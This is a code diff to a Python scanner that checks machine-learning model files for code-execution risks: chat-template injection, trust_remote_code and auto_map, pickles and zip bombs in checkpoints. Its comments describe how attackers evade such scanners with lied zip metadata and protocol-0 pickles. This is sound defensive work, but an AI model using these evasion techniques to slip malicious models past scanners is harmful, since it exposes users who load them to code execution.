                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.85,
-                engine="mfv",
                 metadata={"hits": hits},
             ))
 
@@ -4164,17 +1803,7 @@ class ModelFileScanner:
         # "scenarios.", both in prose and inside a {{ '...' }} literal).
         chat_template = kv.get("tokenizer.chat_template")
         if isinstance(chat_template, str):
-            executable = _GGUF_JINJA_STRING_RE.sub(
-                "",
-                " ".join(
-                    m.group(0)
-                    for m in _GGUF_JINJA_BLOCK_RE.finditer(chat_template)
-                ),
-            )
-            ssti_hit = next(
-                (sig for sig in _GGUF_CHAT_TEMPLATE_SSTI_SIGNATURES if sig in executable),
-                None,
-            )
+            ssti_hit = _jinja_ssti_signature(chat_template)
             if ssti_hit is not None:
                 findings.append(Finding(
                     rule_id="MFV-GGUF-003",
@@ -4184,11 +1813,145 @@ class ModelFileScanner:
                     severity=Severity.CRITICAL,
                     category=Category.SSTI,
                     file_path=str(file_path),
-                    start_line=0,
                     confidence=0.80,
                     cwe_ids=[94, 1336],
-                    engine="mfv",
                 ))
+
+        if kv_window_truncated:
+            # The layout pass (_check_gguf_layout) walked the whole file, but
+            # this content pass stopped at GGUF_METADATA_SCAN_BYTES. Keys past
+            # that offset were never content-checked, so record the coverage
+            # gap rather than let a dangerous key hide past the window in
+            # silence. MFV-GGUF-004 is already this module's GGUF coverage rule.
+            findings.append(Finding(
+                rule_id="MFV-GGUF-004",
+                message="GGUF metadata extends past the "
+                        f"GGUF_METADATA_SCAN_BYTES ({GGUF_METADATA_SCAN_BYTES} bytes) "
+                        "content-scan window, so keys beyond it were not "
+                        "content-checked. Content past the window could not be "
+                        "verified.",
+                severity=Severity.INFO,
+                category=Category.AI_ML,
+                file_path=str(file_path),
+                confidence=0.3,
+                metadata={"skipped_reason": "gguf_metadata_window"},
+            ))
+
+        return findings
+
+    # ── HuggingFace / transformers JSON config scanning ───────────
+
+    def _scan_json_config(self, file_path: Path, config: dict) -> list[Finding]:
+        """Inspect a transformers ``*.json`` config for its two RCE vectors.
+
+        transformers loads these files straight from a model repo, so a
+        malicious value in one executes on load the same way a malicious
+        pickle does:
+
+        1. A Jinja2 ``chat_template`` (in tokenizer_config.json /
+           chat_template.json). This is the MFV-GGUF-003 threat carried in
+           JSON instead of GGUF metadata: the template is rendered on load,
+           so a code-execution construct in code position is SSTI -> RCE.
+
+        2. ``auto_map`` and ``trust_remote_code`` (in config.json). auto_map
+           names custom Python modules in the repo that transformers imports
+           and executes when trust_remote_code is honored, the classic
+           HF-hub remote-code vector.
+
+        Conservative by construction: only the fields transformers actually
+        reads are inspected, the chat_template is matched in Jinja *code
+        position* (see ``_jinja_ssti_signature``) so ordinary substitution
+        templates do not trip it, and everything else in the config is
+        ignored. A plain config with none of these fields yields nothing.
+        """
+        findings: list[Finding] = []
+
+        # ── Vector 1: chat_template SSTI ──────────────────────────
+        # transformers accepts either a single template string or, in the
+        # multi-template form, a list of {"name", "template"} entries. Collect
+        # every template string present and match each in code position.
+        templates: list[str] = []
+        chat_template = config.get("chat_template")
+        if isinstance(chat_template, str):
+            templates.append(chat_template)
+        elif isinstance(chat_template, list):
+            for entry in chat_template:
+                if isinstance(entry, dict) and isinstance(entry.get("template"), str):
+                    templates.append(entry["template"])
+
+        for template in templates:
+            ssti_hit = _jinja_ssti_signature(template)
+            if ssti_hit is not None:
+                findings.append(Finding(
+                    rule_id="MFV-HF-001",
+                    message=f"chat_template contains a code-execution construct "
+                            f"({ssti_hit!r}) inside Jinja2 template syntax. "
+                            f"transformers renders this template on load, so a "
+                            f"malicious template is server-side template injection "
+                            f"for RCE -- the MFV-GGUF-003 / CVE-2026-5760 threat "
+                            f"carried in a standalone JSON config.",
+                    severity=Severity.CRITICAL,
+                    category=Category.SSTI,
+                    file_path=str(file_path),
+                    confidence=0.80,
+                    cwe_ids=[94, 1336],
+                ))
+                # One finding per file: the template is the vector, and a
+                # second matching entry adds no new actionable information.
+                break
+
+        # ── Vector 2: auto_map / trust_remote_code remote code ────
+        # auto_map maps transformers Auto* classes to dotted paths inside the
+        # repo's own custom_code modules, which transformers imports and runs
+        # when the model is loaded with trust_remote_code=True. Flag its
+        # presence; it is not proof of malice (legitimate custom-architecture
+        # models use it) but it is exactly the surface a hub-hosted repo uses
+        # to reach code execution, hence HIGH at moderate confidence.
+        auto_map = config.get("auto_map")
+        if auto_map is not None:
+            # Record the dotted targets when they are the ordinary
+            # str -> str / str -> [str, str] shape, so a reviewer can see which
+            # module would be imported without re-opening the file.
+            targets: list[str] = []
+            if isinstance(auto_map, dict):
+                for value in auto_map.values():
+                    if isinstance(value, str):
+                        targets.append(value)
+                    elif isinstance(value, list):
+                        targets.extend(v for v in value if isinstance(v, str))
+            findings.append(Finding(
+                rule_id="MFV-HF-002",
+                message="config declares auto_map, which points transformers at "
+                        "custom Python modules in the model repo. Those modules "
+                        "are imported and executed when the model is loaded with "
+                        "trust_remote_code=True -- the HuggingFace-hub remote-code "
+                        "execution vector.",
+                severity=Severity.HIGH,
+                category=Category.INJECTION,
+                file_path=str(file_path),
+                confidence=0.70,
+                cwe_ids=[94],
+                metadata={"auto_map_targets": targets} if targets else {},
+            ))
+
+        # A config that ships trust_remote_code: true is a model asserting that
+        # its own repo code should be executed without prompting. That is the
+        # remote-code vector stated in the config itself, reported separately
+        # from auto_map because either can appear without the other.
+        if config.get("trust_remote_code") is True:
+            findings.append(Finding(
+                rule_id="MFV-HF-002",
+                message="config sets trust_remote_code: true, asking loaders to "
+                        "import and execute the repo's own Python without "
+                        "prompting. A model's config asserting that its code "
+                        "should be trusted is the remote-code execution vector, "
+                        "not a safe default.",
+                severity=Severity.HIGH,
+                category=Category.INJECTION,
+                file_path=str(file_path),
+                confidence=0.75,
+                cwe_ids=[94],
+            ))
 
         return findings
 
@@ -4297,10 +2060,8 @@ class ModelFileScanner:
                 severity=Severity.HIGH,
                 category=Category.DESERIALIZATION,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.85,
                 cwe_ids=[502],
-                engine="mfv",
                 metadata={"lambda_layers": lambda_layers},
             ))
 
@@ -4315,10 +2076,8 @@ class ModelFileScanner:
                 severity=Severity.INFO,
                 category=Category.DESERIALIZATION,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.3,
                 cwe_ids=[502],
-                engine="mfv",
                 metadata={"unrecognized_classes": unrecognized},
             ))
 
@@ -4350,13 +2109,17 @@ class ModelFileScanner:
 
     # First bytes of a pickle stream: protocol 2..5 opens with `\x80<proto>`,
     # and protocol 0/1 opens with one of a small set of printable opcodes.
+    # `b"c"` (GLOBAL) over-triggers on ordinary text members, but dropping it
+    # would stop sniffing protocol-0 payloads entirely -- a detection
+    # regression an attacker could pick deliberately -- so it stays.
     _PICKLE_OPENERS: tuple[bytes, ...] = (
         b"\x80\x02", b"\x80\x03", b"\x80\x04", b"\x80\x05",
-        b"c", b"(", b"]", b"}", b"\x28",
+        b"c", b"(", b"]", b"}",
     )
 
     def _zip_member_may_be_pickle(
-        self, zf: zipfile.ZipFile, info: zipfile.ZipInfo, file_path: Path | None,
+        self, zf: zipfile.ZipFile, info: zipfile.ZipInfo,
+        source: Path | bytes | None,
     ) -> bool:
         """Whether a zip member is worth running the pickle analysis over.
 
@@ -4368,33 +2131,44 @@ class ModelFileScanner:
 
         Only the first two bytes are read, which keeps the cost negligible on
         checkpoints whose other members are large tensor blobs.
+
+        The decision never gates on the declared file_size: it is
+        attacker-controlled central-directory metadata, and inflating it used
+        to keep a pickle member from ever being sniffed. The sniff reads real
+        bytes, and every later read path keeps its own decompression cap.
+
+        `source` is where the raw fallback reads: the archive's path on disk,
+        or the archive's bytes for a nested archive held in memory, or None
+        when neither is available (member then stays un-sniffed).
         """
         name = info.filename
         if name.endswith((".pkl", ".pickle")) or name.rsplit("/", 1)[-1] == "data.pkl":
             return True
-        if info.file_size < 2 or info.file_size > self.MAX_ZIP_MEMBER_BYTES:
-            return False
         try:
             with zf.open(info) as handle:
                 head = handle.read(2)
-        except (OSError, zipfile.BadZipFile, RuntimeError, NotImplementedError):
-            # Unreadable through the strict path. Sniff the stored bytes, for
-            # the same reason the read fallback exists below. `file_path` is
-            # None when this member lives inside a nested archive held in
-            # memory: header offsets are then relative to that inner archive,
-            # not to the file on disk, so the raw read would seek to the wrong
-            # bytes and must be skipped rather than trusted.
-            if file_path is None:
+        except (OSError, zipfile.BadZipFile, RuntimeError,
+                NotImplementedError, ValueError):
+            # Unreadable through the strict path (lied central-directory
+            # sizes raise BadZipFile *or* ValueError from zipfile's offset
+            # arithmetic). Sniff the stored bytes, for the same reason the
+            # read fallback exists below.
+            if source is None:
                 return False
-            raw = self._read_zip_member_raw(file_path, info, head_only=True)
+            raw = self._read_zip_member_raw(source, info, head_only=True)
             head = raw or b""
         return head.startswith(self._PICKLE_OPENERS)
 
     def _read_zip_member_raw(
-        self, path: Path, info: zipfile.ZipInfo, head_only: bool = False,
-    ) -> bytes | None:
+        self, source: Path | bytes, info: zipfile.ZipInfo, head_only: bool = False,
+        report_oversized: bool = False,
+    ) -> bytes | None | object:
         """Read a member's bytes straight out of the archive, bypassing
         `zipfile`'s flag-bit checks.
+
+        `source` is the archive's path on disk, or the archive's bytes
+        themselves for a nested archive held in memory (whose local-header
+        offsets are relative to it, not to any file on disk).
 
         Used only when the strict reader refuses. Parses the *local* file
         header (whose name/extra lengths can differ from the central
@@ -4402,32 +2176,64 @@ class ModelFileScanner:
         the data starts, then returns it: verbatim for STORED members, raw-
         inflated for DEFLATED ones.
 
-        Returns None when the member cannot be located or exceeds the size cap.
+        Returns None when the member cannot be located, is unreadable, or (by
+        default) exceeds the size cap. `report_oversized` splits that last case
+        out: when True, a member that decompresses past MAX_ZIP_MEMBER_BYTES
+        returns the `_ZIP_MEMBER_OVERSIZED` sentinel instead of None, so the
+        caller can raise MFV-PICKLE-003 for it exactly as the strict path does,
+        rather than skipping a zip bomb in silence. None still means unreadable.
         Never raises: this runs on attacker-controlled bytes.
         """
         try:
-            with open(path, "rb") as handle:
+            handle = (io.BytesIO(source) if isinstance(source, bytes)
+                      else open(source, "rb"))
+            with handle:
                 handle.seek(info.header_offset)
                 local = handle.read(30)
                 if len(local) < 30 or local[:4] != b"PK\x03\x04":
                     return None
                 name_len, extra_len = struct.unpack("<HH", local[26:30])
                 handle.seek(info.header_offset + 30 + name_len + extra_len)
-                want = 2 if head_only else min(info.compress_size, self.MAX_ZIP_MEMBER_BYTES + 1)
-                if not head_only and info.compress_size > self.MAX_ZIP_MEMBER_BYTES:
-                    return None
+                # No gate on the declared compress_size: like file_size it is
+                # attacker-controlled, and inflating it used to make this
+                # fallback refuse plainly readable members before reading a
+                # byte. The actual read is capped instead, which is the bound
+                # that was always supposed to do the work. head_only reads
+                # enough compressed bytes to inflate the two-byte sniff.
+                want = 128 if head_only else self.MAX_ZIP_MEMBER_BYTES + 1
                 blob = handle.read(want)
-        except OSError:
+        except (OSError, ValueError):
+            # ValueError: zipfile's offset arithmetic can hand back a
+            # negative header_offset when the central directory lies.
             return None
 
         if info.compress_type == zipfile.ZIP_STORED:
+            if head_only:
+                return blob[:2]
+            if len(blob) > self.MAX_ZIP_MEMBER_BYTES:
+                # We read MAX+1 stored bytes and got more than the cap, so the
+                # member is genuinely oversized (not merely unreadable).
+                return _ZIP_MEMBER_OVERSIZED if report_oversized else None
             return blob
-        if head_only:
-            return None
         try:
-            return zlib.decompressobj(-15).decompress(blob, self.MAX_ZIP_MEMBER_BYTES)
+            decompressor = zlib.decompressobj(-15)
+            if head_only:
+                return decompressor.decompress(blob, 2) or None
+            out = decompressor.decompress(blob, self.MAX_ZIP_MEMBER_BYTES)
         except zlib.error:
             return None
+        if not decompressor.eof:
+            # decompress() stopped short of the stream end for one of two
+            # reasons, and they are different verdicts:
+            #   - it hit max_length with compressed input still pending
+            #     (unconsumed_tail non-empty): the member decompresses past the
+            #     cap, i.e. oversized, the same verdict the strict read returns.
+            #   - the compressed input ran out first (unconsumed_tail empty):
+            #     a cut-off stream, i.e. unreadable, never scanned as whole.
+            if decompressor.unconsumed_tail:
+                return _ZIP_MEMBER_OVERSIZED if report_oversized else None
+            return None
+        return out
 
     _ZIP_LOCAL_MAGIC = b"PK\x03\x04"
 
@@ -4512,9 +2318,7 @@ class ModelFileScanner:
                         severity=Severity.LOW,
                         category=Category.AI_ML,
                         file_path=str(file_path),
-                        start_line=0,
                         confidence=0.50,
-                        engine="mfv",
                         metadata={"skipped_reason": "member_cap"},
                     ))
                 else:
@@ -4534,9 +2338,7 @@ class ModelFileScanner:
                                 severity=Severity.LOW,
                                 category=Category.AI_ML,
                                 file_path=str(file_path),
-                                start_line=0,
                                 confidence=0.55,
-                                engine="mfv",
                                 metadata={"skipped_reason": "unread_tail",
                                           "unread_bytes": file_size - consumed},
                             ))
@@ -4553,9 +2355,7 @@ class ModelFileScanner:
                 severity=Severity.LOW,
                 category=Category.AI_ML,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.50,
-                engine="mfv",
                 metadata={"skipped_reason": "tar_walk_failed", "error": type(exc).__name__},
             ))
         return findings
@@ -4574,23 +2374,29 @@ class ModelFileScanner:
 
         Bounded to exactly one extra level. That matches the real packaging
         convention and leaves no unbounded recursion for a nested-zip bomb to
-        drive; the per-member size cap still applies at both levels.
+        drive; the per-member size cap still applies to every actual read at
+        both levels. The decision never gates on the declared file_size: it
+        is attacker-controlled, and inflating it used to keep a nested
+        checkpoint from ever being sniffed.
         """
-        if info.file_size < 4 or info.file_size > self.MAX_ZIP_MEMBER_BYTES:
-            return []
         try:
             with zf.open(info) as handle:
                 if handle.read(4) != self._ZIP_LOCAL_MAGIC:
                     return []
             blob = self._read_zip_member_capped(zf, info.filename, self.MAX_ZIP_MEMBER_BYTES)
-        except (OSError, zipfile.BadZipFile, RuntimeError, NotImplementedError):
+        except (OSError, zipfile.BadZipFile, RuntimeError,
+                NotImplementedError, ValueError):
             # Same lie the .pt walk already handles one level up: lied flag
-            # bits make the strict reader refuse a plainly readable member.
-            # The only caller opens `zf` on `file_path` itself, so the raw
-            # local-header read is valid here.
+            # bits or lied sizes make the strict reader refuse a plainly
+            # readable member. The only caller opens `zf` on `file_path`
+            # itself, so the raw local-header read is valid here.
             blob = self._read_zip_member_raw(file_path, info)
             if blob is None or blob[:4] != self._ZIP_LOCAL_MAGIC:
                 return []
+            # The raw read is capped, not member-exact: a lied declared size
+            # lets it run past the member into the outer container's own
+            # bytes, which would confuse the nested archive's parse.
+            blob = _zip_blob_upto_archive_end(blob)
         if blob is None:
             return []
 
@@ -4607,17 +2413,20 @@ class ModelFileScanner:
         try:
             with zipfile.ZipFile(io.BytesIO(blob)) as inner_zf:
                 for inner in inner_zf.infolist():
-                    # file_path is deliberately None: the raw-bytes fallback
-                    # keys off on-disk header offsets, which are meaningless
-                    # for an archive that only exists in memory.
-                    if not self._zip_member_may_be_pickle(inner_zf, inner, None):
+                    # The raw-bytes fallback gets the archive's own bytes:
+                    # local-header offsets are relative to this in-memory
+                    # archive, not to any file on disk.
+                    if not self._zip_member_may_be_pickle(inner_zf, inner, blob):
                         continue
                     try:
                         data = self._read_zip_member_capped(
                             inner_zf, inner.filename, self.MAX_ZIP_MEMBER_BYTES,
                         )
-                    except (OSError, zipfile.BadZipFile, RuntimeError, NotImplementedError):
-                        continue
+                    except (OSError, zipfile.BadZipFile, RuntimeError,
+                            NotImplementedError, ValueError):
+                        # Same lied-metadata shape one level up: the strict
+                        # reader refuses, the bytes are plainly there.
+                        data = self._read_zip_member_raw(blob, inner)
                     if data is None:
                         continue
                     label = f"{prefix}/{inner.filename}"
@@ -4638,9 +2447,7 @@ class ModelFileScanner:
                 severity=Severity.LOW,
                 category=Category.AI_ML,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.50,
-                engine="mfv",
                 metadata={
                     "skipped_reason": "zip_walk_failed",
                     "error": type(exc).__name__,
@@ -4648,6 +2455,58 @@ class ModelFileScanner:
                 },
             ))
         return findings
+
+    def _torch_source_finding(
+        self, file_path: Path, names: list[str],
+    ) -> Finding | None:
+        """MFV-TORCH-001: a torch zip carries executable Python source.
+
+        Conservative by construction, to avoid flagging an ordinary data
+        member: it fires only when the archive both (a) carries `*.py`
+        members and (b) looks like a torch container that would actually
+        execute them. Recognition markers are the two layouts that do:
+        torch.package's `.data/` directory and its `extern_modules` /
+        `python_version` manifest, and TorchScript's `code/` directory
+        alongside a `data.pkl` / `constants.pkl` pickle. A plain state_dict
+        checkpoint has no `.py` members at all, so it never reaches the
+        second condition.
+        """
+        source_members = [n for n in names if n.endswith(".py")]
+        if not source_members:
+            return None
+
+        # A torch container, not just any zip that happens to hold a .py.
+        # `.data/` (with a leading path segment or at the root) and a
+        # top-level `code/` are the package/TorchScript signatures; the
+        # pickle sidecars confirm it is a serialized model rather than a
+        # source tarball someone renamed.
+        def _is_torch_layout(n: str) -> bool:
+            segments = n.split("/")
+            last = segments[-1]
+            return (
+                ".data" in segments
+                or segments[0] == "code"
+                or last in ("data.pkl", "constants.pkl", "extern_modules")
+            )
+
+        if not any(_is_torch_layout(n) for n in names):
+            return None
+
+        shown = ", ".join(sorted(source_members)[:5])
+        return Finding(
+            rule_id="MFV-TORCH-001",
+            message=f"Torch archive carries executable Python source that runs "
+                    f"on load: {shown}. torch.package's PackageImporter imports "
+                    f"these modules and torch.jit compiles a TorchScript "
+                    f"`code/` directory, so loading the model executes the "
+                    f"packaged code, not just the weights.",
+            severity=Severity.HIGH,
+            category=Category.DESERIALIZATION,
+            file_path=str(file_path),
+            confidence=0.75,
+            cwe_ids=[94],
+            metadata={"source_members": sorted(source_members)[:20]},
+        )
 
     def _scan_pytorch_zip(self, file_path: Path) -> list[Finding]:
         """Scan the pickle stream(s) inside a PyTorch (or other) zip checkpoint.
@@ -4661,10 +2520,31 @@ class ModelFileScanner:
         try:
             zf = zipfile.ZipFile(file_path, "r")
         except (zipfile.BadZipFile, OSError):
-            # Not actually a zip, so treat it as a legacy flat pickle.
-            return self._scan_pickle(file_path, file_path.read_bytes())
+            # Not actually a zip, so treat it as a legacy flat pickle. The
+            # read is capped: this path is also reachable from scan_file's
+            # oversized-file branch for anything zipfile.is_zipfile() merely
+            # liked the look of, where an unbounded read_bytes() would pull
+            # multi-GB into memory despite the cap that exists to prevent
+            # exactly that. A pickle never needs more than the scan cap to
+            # be analysed, so the prefix carries every verdict this path can.
+            with open(file_path, "rb") as handle:
+                data = handle.read(self.MAX_SCAN_BYTES)
+            return self._scan_pickle(file_path, data)
         try:
             with zf:
+                # Before the pickle walk: a torch zip can carry executable
+                # Python *source*, not just a pickle. torch.package archives
+                # ship a `.data/` layout with `*.py` modules that
+                # PackageImporter imports on load, and a TorchScript archive
+                # ships a `code/` directory of `.py` that torch.jit compiles
+                # and runs on load. Either way the source executes when the
+                # model is loaded, so it is a code-execution surface a pickle
+                # scan alone would miss. Reported separately from the pickle
+                # findings via MFV-TORCH-001.
+                names = [info.filename for info in zf.infolist()]
+                source_finding = self._torch_source_finding(file_path, names)
+                if source_finding is not None:
+                    findings.append(source_finding)
                 for info in zf.infolist():
                     name = info.filename
                     if not self._zip_member_may_be_pickle(zf, info, file_path):
@@ -4672,7 +2552,8 @@ class ModelFileScanner:
                         continue
                     try:
                         inner = self._read_zip_member_capped(zf, name, self.MAX_ZIP_MEMBER_BYTES)
-                    except (OSError, zipfile.BadZipFile, RuntimeError, NotImplementedError):
+                    except (OSError, zipfile.BadZipFile, RuntimeError,
+                            NotImplementedError, ValueError):
                         # A member the strict reader refuses is NOT evidence of
                         # safety, and skipping it silently reported the file
                         # clean. The refusal is usually a lie: setting the
@@ -4691,10 +2572,18 @@ class ModelFileScanner:
                         # and nothing is reported -- which is the correct
                         # outcome, and is what keeps a genuinely
                         # password-protected archive quiet.
-                        inner = self._read_zip_member_raw(file_path, info)
+                        # report_oversized so an oversized member read through
+                        # the raw fallback reaches the same MFV-PICKLE-003
+                        # verdict below as the strict path, instead of the raw
+                        # None being silently skipped (a zip bomb the strict
+                        # reader would have flagged but a lied flag bit routed
+                        # here).
+                        inner = self._read_zip_member_raw(
+                            file_path, info, report_oversized=True,
+                        )
                         if inner is None:
                             continue
-                    if inner is None:
+                    if inner is None or inner is _ZIP_MEMBER_OVERSIZED:
                         findings.append(Finding(
                             rule_id="MFV-PICKLE-003",
                             message=f"[{name}] Pickle member exceeds "
@@ -4703,9 +2592,7 @@ class ModelFileScanner:
                             severity=Severity.HIGH,
                             category=Category.AI_ML,
                             file_path=str(file_path),
-                            start_line=0,
                             confidence=0.6,
-                            engine="mfv",
                             metadata={"zip_member": name, "skipped_reason": "oversized_decompressed"},
                         ))
                         continue
@@ -4730,9 +2617,7 @@ class ModelFileScanner:
                 severity=Severity.LOW,
                 category=Category.AI_ML,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.50,
-                engine="mfv",
                 metadata={"skipped_reason": "zip_walk_failed", "error": type(exc).__name__},
             ))
         return findings
@@ -4808,9 +2693,7 @@ class ModelFileScanner:
                     severity=Severity.INFO,
                     category=Category.AI_ML,
                     file_path=str(file_path),
-                    start_line=0,
                     confidence=0.4,
-                    engine="mfv",
                 ))
             for info in schemas:
                 if info.file_size > self._SKOPS_MAX_SCHEMA_BYTES:
@@ -4822,13 +2705,17 @@ class ModelFileScanner:
                         severity=Severity.LOW,
                         category=Category.AI_ML,
                         file_path=str(file_path),
-                        start_line=0,
                         confidence=0.4,
-                        engine="mfv",
                     ))
                     continue
-                raw = self._read_zip_member_capped(
-                    zf, info.filename, self._SKOPS_MAX_SCHEMA_BYTES)
+                try:
+                    raw = self._read_zip_member_capped(
+                        zf, info.filename, self._SKOPS_MAX_SCHEMA_BYTES)
+                except (OSError, zipfile.BadZipFile, RuntimeError,
+                        NotImplementedError, ValueError):
+                    # One unreadable member must not abort the whole archive
+                    # walk: the pickle-member pass below still has to run.
+                    raw = None
                 if raw is None:
                     continue
                 try:
@@ -4842,9 +2729,7 @@ class ModelFileScanner:
                         severity=Severity.INFO,
                         category=Category.AI_ML,
                         file_path=str(file_path),
-                        start_line=0,
                         confidence=0.4,
-                        engine="mfv",
                     ))
                     continue
                 findings.extend(self._scan_skops_schema(file_path, info.filename, schema))
@@ -4857,8 +2742,14 @@ class ModelFileScanner:
                     continue
                 if not self._zip_member_may_be_pickle(zf, info, file_path):
                     continue
-                inner = self._read_zip_member_capped(zf, info.filename,
-                                                     self.MAX_ZIP_MEMBER_BYTES)
+                try:
+                    inner = self._read_zip_member_capped(zf, info.filename,
+                                                         self.MAX_ZIP_MEMBER_BYTES)
+                except (OSError, zipfile.BadZipFile, RuntimeError,
+                        NotImplementedError, ValueError):
+                    # Lied metadata makes the strict reader refuse a plainly
+                    # readable member; the bytes on disk are still readable.
+                    inner = self._read_zip_member_raw(file_path, info)
                 if inner is None:
                     continue
                 findings.append(Finding(
@@ -4870,10 +2761,8 @@ class ModelFileScanner:
                     severity=Severity.LOW,
                     category=Category.DESERIALIZATION,
                     file_path=str(file_path),
-                    start_line=0,
                     confidence=0.6,
                     cwe_ids=[502],
-                    engine="mfv",
                     metadata={"zip_member": info.filename},
                 ))
                 for f in self._scan_pickle(file_path, inner):
@@ -4950,10 +2839,8 @@ class ModelFileScanner:
                 severity=Severity.CRITICAL,
                 category=Category.DESERIALIZATION,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.9,
                 cwe_ids=[502],
-                engine="mfv",
                 metadata={"inconsistencies": structural},
             ))
         if denied:
@@ -4966,10 +2853,8 @@ class ModelFileScanner:
                 severity=Severity.CRITICAL,
                 category=Category.DESERIALIZATION,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.9,
                 cwe_ids=[502],
-                engine="mfv",
                 metadata={"denied_types": sorted(denied)},
             ))
         if unknown or unknown_loaders:
@@ -4994,10 +2879,8 @@ class ModelFileScanner:
                 severity=Severity.INFO,
                 category=Category.DESERIALIZATION,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.4,
                 cwe_ids=[502],
-                engine="mfv",
                 metadata={
                     "unknown_types": sorted(set(unknown)),
                     "unknown_loaders": sorted(set(unknown_loaders)),
@@ -5038,10 +2921,8 @@ class ModelFileScanner:
                 severity=Severity.HIGH,
                 category=Category.AI_ML,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.75,
                 cwe_ids=[502, 94],
-                engine="mfv",
                 metadata={"dangerous_ops": dangerous_ops},
             ))
 
@@ -5066,10 +2947,8 @@ class ModelFileScanner:
                 severity=Severity.HIGH,
                 category=Category.SSRF,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.85,
                 cwe_ids=[918],
-                engine="mfv",
                 metadata={"locations": remote_locations[:20]},
             ))
 
@@ -5096,10 +2975,8 @@ class ModelFileScanner:
                 severity=Severity.MEDIUM,
                 category=Category.PATH_TRAVERSAL,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.5,
                 cwe_ids=[22],
-                engine="mfv",
                 metadata={"traversal_paths": traversal_paths[:20]},
             ))
 
@@ -5120,10 +2997,8 @@ class ModelFileScanner:
                 severity=Severity.HIGH,
                 category=Category.AI_ML,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.75,
                 cwe_ids=[502],
-                engine="mfv",
                 metadata={"unexpected_keys": unexpected_keys[:20]},
             ))
 
@@ -5158,10 +3033,8 @@ class ModelFileScanner:
                 severity=Severity.HIGH,
                 category=Category.AI_ML,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.6,
                 cwe_ids=[502, 94],
-                engine="mfv",
                 metadata={"dangerous_ops": dangerous_ops},
             ))
         return findings
@@ -5198,10 +3071,8 @@ class ModelFileScanner:
                 severity=Severity.HIGH,
                 category=Category.INJECTION,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.9,
                 cwe_ids=[611, 918],
-                engine="mfv",
                 metadata={"entity_name": exc.name, "system_id": exc.sysid},
             ))
             return findings
@@ -5236,10 +3107,8 @@ class ModelFileScanner:
                 severity=Severity.HIGH,
                 category=Category.AI_ML,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.7,
                 cwe_ids=[94],
-                engine="mfv",
                 metadata={"dangerous_functions": dangerous[:20]},
             ))
         return findings
@@ -5251,11 +3120,14 @@ class ModelFileScanner:
 
     # 7z is the one container that re-enters scan_file on what it extracts, so
     # an archive containing an archive recurses. Measured with a stub extractor
-    # that yields a copy of its own input: RecursionError, which is an
+    # that yielded a copy of its own input: RecursionError, which is an
     # unhandled crash rather than a verdict. Real checkpoints are never nested
     # this deep; four levels is generous.
     MAX_ARCHIVE_DEPTH = 4
-    _archive_depth = 0
+    # The depth counter is instance state (initialised in __init__), not a
+    # class attribute mutated through `self`: the class-attribute form makes
+    # per-scan state look shared and survives a scan that dies before its
+    # decrement only by accident of rebinding.
 
     def _scan_7z(self, file_path: Path) -> list[Finding]:
         """7z is an extraction problem, not a parse problem: py7zr is
@@ -5296,9 +3168,7 @@ class ModelFileScanner:
                 severity=Severity.INFO,
                 category=Category.AI_ML,
                 file_path=str(file_path),
-                start_line=0,
                 confidence=0.4,
-                engine="mfv",
                 metadata={"skipped_reason": "no_extractor"},
             )]
 
@@ -5313,11 +3183,15 @@ class ModelFileScanner:
             except (OSError, subprocess.TimeoutExpired):
                 listing = None
             if listing is not None and listing.returncode == 0:
-                total = sum(
-                    int(line.split("=", 1)[1].strip() or 0)
-                    for line in listing.stdout.splitlines()
-                    if line.startswith("Size =")
-                )
+                total = 0
+                for line in listing.stdout.splitlines():
+                    if not line.startswith("Size ="):
+                        continue
+                    # A non-numeric Size= line (attacker-chosen extractor
+                    # output shape) raises ValueError; it counts as zero
+                    # rather than aborting the scan.
+                    with contextlib.suppress(ValueError):
+                        total += int(line.split("=", 1)[1].strip() or 0)
             else:
                 total = 0
             if total > self._SEVENZ_MAX_TOTAL_BYTES:
@@ -5329,9 +3203,7 @@ class ModelFileScanner:
                     severity=Severity.LOW,
                     category=Category.AI_ML,
                     file_path=str(file_path),
-                    start_line=0,
                     confidence=0.5,
-                    engine="mfv",
                     metadata={"skipped_reason": "oversized", "claimed_total": total},
                 )]
             try:
@@ -5412,16 +3284,21 @@ class ModelFileScanner:
             severity=Severity.HIGH,
             category=Category.AI_ML,
             file_path=str(file_path),
-            start_line=0,
             confidence=0.75,
             cwe_ids=[190, 125],
-            engine="mfv",
             metadata={"layout_problems": problems[:20]},
         )]
 
     # ── numpy .npy/.npz scanning ───────────────────────────────────
 
     _NPY_MAGIC = b"\x93NUMPY"
+
+    # Cap on header bytes handed to ast.literal_eval. A v2 header_len is a
+    # u32 (up to 4GB) and the whole file can sit under the 500MB scan cap;
+    # real .npy headers are ~100 bytes, so 1MB is four orders of magnitude
+    # of headroom. Over-cap is treated as an unparseable header, the same
+    # verdict as any other header literal_eval rejects.
+    _NPY_MAX_HEADER_BYTES = 1 << 20
 
     def _parse_npy_header(self, data: bytes) -> tuple[dict[str, Any], int] | None:
         """Parse a .npy file's header dict and return (header, data_offset).
@@ -5444,12 +3321,18 @@ class ModelFileScanner:
                 return None
             header_len = struct.unpack("<I", data[8:12])[0]
             header_start = 12
+        if header_len > self._NPY_MAX_HEADER_BYTES:
+            return None
         header_end = header_start + header_len
         if header_end > len(data):
             return None
         try:
             header = ast.literal_eval(data[header_start:header_end].decode("latin1").strip())
-        except (ValueError, SyntaxError, UnicodeDecodeError):
+        except (ValueError, SyntaxError, UnicodeDecodeError, MemoryError,
+                RecursionError):
+            # MemoryError/RecursionError: the header literal is
+            # attacker-shaped (a 1MB nest of braces reaches both) and the
+            # verdict for it is the same as for any unparseable header.
             return None
         if not isinstance(header, dict):
             return None
@@ -5534,10 +3417,8 @@ class ModelFileScanner:
             severity=Severity.MEDIUM,
             category=Category.PATH_TRAVERSAL,
